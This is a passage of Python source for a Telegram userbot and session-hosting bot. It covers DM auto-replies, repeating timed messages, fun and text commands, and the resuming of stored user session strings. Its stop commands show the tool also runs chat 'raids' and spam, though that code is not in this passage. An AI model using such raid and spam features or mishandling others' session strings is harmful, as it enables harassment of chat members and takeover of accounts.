    async def dm_incoming_handler(event):
        if not event.is_private:
            return
        sender_id = event.sender_id
        if not sender_id or sender_id == owner_id:
            return

        if sender_id in dm_muted_users.get(owner_id, set()):
            try:
                await event.delete()
            except Exception:
                pass
            return

        if dm_block_enabled.get(owner_id, False):
            try:
                await ubot(BlockRequest(id=sender_id))
                return
            except Exception:
                pass

        if dm_welcome_enabled.get(owner_id, True):
            welcomed = dm_welcomed_users.setdefault(owner_id, set())
            if sender_id not in welcomed:
                welcomed.add(sender_id)
                try:
                    await event.reply("✦ 𝐇𝐄𝐘𝐘 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐃𝐌 ✦")
                except Exception:
                    pass

        if owner_id in afk_status:
            try:
                await event.reply(f"💤 **Main abhi AFK hoon.**\n📌 **Reason:** `{afk_status[owner_id]}`")
            except Exception:
                pass

    async def _say30_loop(target_chat, text):
        try:
            while True:
                await asyncio.sleep(1800)
                try:
                    await ubot.send_message(target_chat, text)
                except FloodWaitError as f:
                    await asyncio.sleep(f.seconds + 1)
                except Exception:
                    break
        except asyncio.CancelledError:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.say30\b', outgoing=True))
    async def say30_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.say30 [text]`")
            return
        key = (owner_id, event.chat_id)
        old = interval_30m_tasks.pop(key, None)
        if old:
            old.cancel()
        interval_30m_tasks[key] = asyncio.create_task(_say30_loop(event.chat_id, parts[1].strip()))
        await event.edit("⏰ **30-minute auto-message chalu ho gaya hai.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stop30$', outgoing=True))
    async def stop30_cmd(event):
        key = (owner_id, event.chat_id)
        t = interval_30m_tasks.pop(key, None)
        if t:
            t.cancel()
            await event.edit("🛑 **30-minute auto-message band kar diya gaya.**")
        else:
            await event.edit("ℹ️ **Is chat mein `.say30` chalu nahi hai.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stop$', outgoing=True))
    async def stop_raid_cmd(event):
        active_raids.discard(event.chat_id)
        t = active_raid_tasks.pop(event.chat_id, None)
        if t:
            t.cancel()
        await event.edit("🛑 **Is chat ke active raid/spam ruk gaye.**")

    @ubot.on(events.NewMessage(pattern=r'^\.stopall$', outgoing=True))
    async def stopall_cmd(event):
        active_raids.clear()
        for t in list(active_raid_tasks.values()):
            t.cancel()
        active_raid_tasks.clear()
        for t in list(interval_30m_tasks.values()):
            t.cancel()
        interval_30m_tasks.clear()
        await event.edit("🛑 **Saare active raids aur 30m tasks band kar diye gaye.**")

    @ubot.on(events.NewMessage(pattern=r'^\.clear$', outgoing=True))
    async def clear_states_cmd(event):
        cid = event.chat_id
        self_reacts.pop(cid, None)
        user_react_targets.pop(cid, None)
        all_reacts.pop(cid, None)
        autopin_chats.discard(cid)
        for item in [x for x in rraid_targets if x[0] == cid]:
            rraid_targets.discard(item)
        await event.edit("🧹 **Is chat ki saari active settings clear ho gayi.**")

    @ubot.on(events.NewMessage(pattern=r'^\.restart$', outgoing=True))
    async def restart_ubot_cmd(event):
        await event.edit("🔄 **Userbot session restart ho raha hai...**")
        asyncio.create_task(start_userbot_session(session_string, owner_id))
        await ubot.disconnect()

    @ubot.on(events.NewMessage(pattern=r'^\.help$', outgoing=True))
    async def ubot_help_cmd(event):
        await event.edit(STATIC_COMMANDS_TEXT)

    # 12. FUN, TEXT & UTILITY
    @ubot.on(events.NewMessage(pattern=r'^\.roast$', outgoing=True))
    async def roast_cmd(event):
        await event.edit(f"🔥 {random.choice(ROAST_LINES)}")

    @ubot.on(events.NewMessage(pattern=r'^\.iq$', outgoing=True))
    async def iq_cmd(event):
        await event.edit(f"🧠 **IQ Level:** `{random.randint(40, 180)}`")

    @ubot.on(events.NewMessage(pattern=r'^\.love$', outgoing=True))
    async def love_cmd(event):
        await event.edit(f"❤️ **Love Meter:** `{random.randint(1, 100)}%`")

    @ubot.on(events.NewMessage(pattern=r'^\.(toss|coin)$', outgoing=True))
    async def toss_cmd(event):
        await event.edit(f"🪙 **Result:** **{random.choice(['HEADS', 'TAILS'])}**")

    @ubot.on(events.NewMessage(pattern=r'^\.dice$', outgoing=True))
    async def dice_cmd(event):
        await event.edit(f"🎲 **Dice:** `{random.randint(1, 6)}`")

    @ubot.on(events.NewMessage(pattern=r'^\.rate\b', outgoing=True))
    async def rate_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        topic = parts[1].strip() if len(parts) > 1 else "is cheez"
        await event.edit(f"⭐ **{topic}** ko rating: **`{random.randint(1, 10)}/10`**")

    def _safe_calc(expr):
        allowed = set("0123456789+-*/().% ")
        if not expr or any(c not in allowed for c in expr):
            raise ValueError("Invalid characters")
        return eval(expr, {"__builtins__": None}, {})

    @ubot.on(events.NewMessage(pattern=r'^\.(calc|calc2)\b', outgoing=True))
    async def calc_cmd(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} 25*4`")
            return
        try:
            ans = _safe_calc(parts[1].strip())
            await event.edit(f"🧮 **Result:** `{ans}`")
        except Exception:
            await event.edit("❌ **Expression galat hai.**")

    def _mock_str(s, alt=False):
        out = []
        for idx, ch in enumerate(s):
            if alt:
                out.append(ch.upper() if idx % 2 == 0 else ch.lower())
            else:
                out.append(ch.upper() if random.choice([True, False]) else ch.lower())
        return "".join(out)

    @ubot.on(events.NewMessage(pattern=r'^\.(mock|mock2)\b', outgoing=True))
    async def mock_cmd(event):
        cmd = event.pattern_match.group(1)
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else (await event.get_reply_message()).text if event.is_reply else ""
        if not txt:
            await event.edit(f"ℹ️ **Istemaal:** `.{cmd} [text]`")
            return
        await event.edit(_mock_str(txt, alt=(cmd == "mock2")))

    @ubot.on(events.NewMessage(pattern=r'^\.reverse\b', outgoing=True))
    async def reverse_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else (await event.get_reply_message()).text if event.is_reply else ""
        await event.edit(txt[::-1] if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.clap\b', outgoing=True))
    async def clap_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1].strip() if len(parts) > 1 else ""
        await event.edit(" 👏 ".join(txt.split()) if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.vapor\b', outgoing=True))
    async def vapor_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else ""
        await event.edit(" ".join(list(txt)) if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.trim\b', outgoing=True))
    async def trim_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1].strip() if len(parts) > 1 else ""
        await event.edit(re.sub(r"\s+", " ", txt) if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.caps\b', outgoing=True))
    async def caps_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else ""
        await event.edit(txt.upper() if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.lower\b', outgoing=True))
    async def lower_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else ""
        await event.edit(txt.lower() if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.title\b', outgoing=True))
    async def title_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else ""
        await event.edit(txt.title() if txt else "ℹ️ **Text dein.**")

    @ubot.on(events.NewMessage(pattern=r'^\.ship$', outgoing=True))
    async def ship_cmd(event):
        await event.edit(f"🚢 **Ship Compatibility:** `{random.randint(1, 100)}%` 💕")

    @ubot.on(events.NewMessage(pattern=r'^\.slap$', outgoing=True))
    async def slap_cmd(event):
        await event.edit("👋💥 *Thappad laga!*")

    @ubot.on(events.NewMessage(pattern=r'^\.hug$', outgoing=True))
    async def hug_cmd(event):
        await event.edit("🤗 *Ek tight hug!*")

    @ubot.on(events.NewMessage(pattern=r'^\.8ball\b', outgoing=True))
    async def eightball_cmd(event):
        ans = ["Haan bilkul.", "Bilkul nahi.", "Shayad.", "Baad mein poochho.", "100% pakka."]
        await event.edit(f"🎱 {random.choice(ans)}")

    @ubot.on(events.NewMessage(pattern=r'^\.fact$', outgoing=True))
    async def fact_cmd(event):
        facts = [
            "Honey kabhi kharab nahi hota.",
            "Octopus ke teen dil hote hain.",
            "Telegram bot API aur MTProto alag kaam karte hain."
        ]
        await event.edit(f"💡 **Fact:** {random.choice(facts)}")

    @ubot.on(events.NewMessage(pattern=r'^\.shayari$', outgoing=True))
    async def shayari_cmd(event):
        shayaris = [
            "Khamoshi mein bhi apni ek baat hoti hai,\nMehfil mein bhi tanhai ka ehsaas hota hai.",
            "Waqt badalta hai, par yaadein wahi rehti hain,\nKuch baatein dil ke kisi kone mein chhupi rehti hain."
        ]
        await event.edit(f"✍️ {random.choice(shayaris)}")

    @ubot.on(events.NewMessage(pattern=r'^\.tts\b', outgoing=True))
    async def tts_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        txt = parts[1].strip() if len(parts) > 1 else ""
        if not txt:
            await event.edit("ℹ️ **Istemaal:** `.tts [text]`")
            return
        try:
            from gtts import gTTS
            with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as tf:
                path = tf.name
            gTTS(text=txt, lang="hi").save(path)
            await ubot.send_file(event.chat_id, path, voice_note=True)
            await event.delete()
            os.remove(path)
        except Exception:
            await event.edit(f"🗣️ **TTS:** {txt}")

    @ubot.on(events.NewMessage(pattern=r'^\.ping$', outgoing=True))
    async def ping_cmd(event):
        t0 = time.time()
        m = await event.edit("🏓 **Pinging...**")
        ms = int((time.time() - t0) * 1000)
        await m.edit(f"⚡ **{BOT_BRAND} Pong:** `{ms} ms`\n🕒 **Uptime:** `{format_uptime()}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(alive|alive2)$', outgoing=True))
    async def alive_cmd(event):
        cmd = event.pattern_match.group(1)
        txt = (
            f"⚡ **{BOT_BRAND} IS ALIVE** ⚡\n"
            f"• **Owner:** `{OWNER_NAME}` (`{OWNER_ID}`)\n"
            f"• **Uptime:** `{format_uptime()}`\n"
            f"• **Mode:** `{'FULL V2' if cmd == 'alive2' else 'STANDARD'}`"
        )
        await event.edit(txt)

    @ubot.on(events.NewMessage(pattern=r'^\.(id|id2)$', outgoing=True))
    async def id_cmd(event):
        rep = await event.get_reply_message() if event.is_reply else None
        target_uid = rep.sender_id if rep else event.sender_id
        await event.edit(f"🆔 **User ID:** `{target_uid}`\n💬 **Chat ID:** `{event.chat_id}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(info|info2|whois|whois2)$', outgoing=True))
    async def info_cmd(event):
        rep = await event.get_reply_message() if event.is_reply else None
        target = rep.sender if rep else await event.get_sender()
        if not target:
            await event.edit("❌ **User info nahi mil saki.**")
            return
        fname = getattr(target, "first_name", "") or "N/A"
        lname = getattr(target, "last_name", "") or ""
        uname = f"@{target.username}" if getattr(target, "username", None) else "None"
        await event.edit(
            f"👤 **User Info**\n"
            f"• **Name:** `{(fname + ' ' + lname).strip()}`\n"
            f"• **ID:** `{target.id}`\n"
            f"• **Username:** `{uname}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.(chatinfo|chatinfo2)$', outgoing=True))
    async def chatinfo_cmd(event):
        chat = await event.get_chat()
        title = getattr(chat, "title", None) or getattr(chat, "first_name", "Private Chat")
        await event.edit(f"💬 **Chat:** `{title}`\n🆔 **Chat ID:** `{event.chat_id}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(stats|stats2)$', outgoing=True))
    async def stats_cmd(event):
        await event.edit(
            f"📊 **{BOT_BRAND} Stats**\n"
            f"• **Hosted Sessions:** `{len(user_sessions)}`\n"
            f"• **Active Raids:** `{len(active_raids)}`\n"
            f"• **Uptime:** `{format_uptime()}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.time$', outgoing=True))
    async def time_cmd(event):
        await event.edit(f"🕒 **Time:** `{datetime.now().strftime('%I:%M:%S %p')}`")

    @ubot.on(events.NewMessage(pattern=r'^\.date$', outgoing=True))
    async def date_cmd(event):
        await event.edit(f"📅 **Date:** `{datetime.now().strftime('%d %B %Y')}`")

    @ubot.on(events.NewMessage(pattern=r'^\.afk\b', outgoing=True))
    async def afk_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        reason = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "Busy"
        afk_status[owner_id] = reason
        await event.edit(f"💤 **AFK ON:** `{reason}`")

    async def _timebio_loop():
        try:
            while True:
                now_str = datetime.now().strftime("%I:%M %p")
                try:
                    await ubot(UpdateProfileRequest(about=f"{BOT_BRAND} | {now_str}"))
                except Exception:
                    pass
                await asyncio.sleep(60)
        except asyncio.CancelledError:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.timebio\s+(on|off)$', outgoing=True))
    async def timebio_cmd(event):
        st = event.pattern_match.group(1).lower()
        t = timebio_tasks.pop(owner_id, None)
        if t:
            t.cancel()
        if st == "on":
            timebio_tasks[owner_id] = asyncio.create_task(_timebio_loop())
            await event.edit("🕒 **TimeBio ON.**")
        else:
            await event.edit("🕒 **TimeBio OFF.**")

    @ubot.on(events.NewMessage(pattern=r'^\.(save|save2)$', outgoing=True))
    async def save_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message ya media par reply karke `.save` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            await ubot.send_message("me", rep)
            await event.edit("💾 **Saved Messages mein save ho gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Save fail:** `{e}`")

    await ubot.start()
    print(f"[{BOT_BRAND}] Userbot active for owner_id={owner_id}", flush=True)
    await ubot.run_until_disconnected()

async def _resume_all_saved_sessions():
    await asyncio.sleep(2)
    for uid_str, s_str in list(user_sessions.items()):
        if s_str:
            try:
                asyncio.create_task(start_userbot_session(s_str, int(uid_str)))
            except Exception as e:
                print(f"Resume error for {uid_str}: {e}", flush=True)

async def _run_bot_main():
    await bot.start(bot_token=BOT_TOKEN)
    print(f"[{BOT_BRAND}] Hosting bot running...", flush=True)
    loop.create_task(_resume_all_saved_sessions())
    await bot.run_until_disconnected()

try:
    loop.run_until_complete(_run_bot_main())
finally:
    pending = asyncio.all_tasks(loop)
    for task in pending:
        task.cancel()
    if pending:
        loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
    loop.close()
